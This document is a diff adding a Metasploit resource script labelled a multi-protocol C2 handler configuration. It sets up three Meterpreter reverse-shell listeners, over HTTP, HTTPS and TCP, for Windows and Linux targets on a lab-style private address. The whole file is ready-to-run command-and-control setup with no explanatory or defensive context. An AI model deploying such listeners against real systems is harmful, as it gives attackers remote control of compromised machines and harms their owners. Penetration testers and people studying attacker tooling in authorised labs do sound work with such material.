@@ -1,0 +1,30 @@
+# Multi-Protocol C2 Handler Configuration
+
+# 1. HTTP Listener (Windows)
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 192.168.56.10
+set LPORT 8080
+set ExitOnSession false
+set SessionCommunicationTimeout 10
+set SessionExpirationTimeout 3600
+exploit -j -z
+
+# 2. HTTPS Listener (Windows Encrypted)
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 192.168.56.10
+set LPORT 8443
+set ExitOnSession false
+set SessionCommunicationTimeout 10
+set SessionExpirationTimeout 3600
+# Note: Self-signed cert will be auto-generated
+exploit -j -z
+
+# 3. TCP Listener (Linux/MX)
+use multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
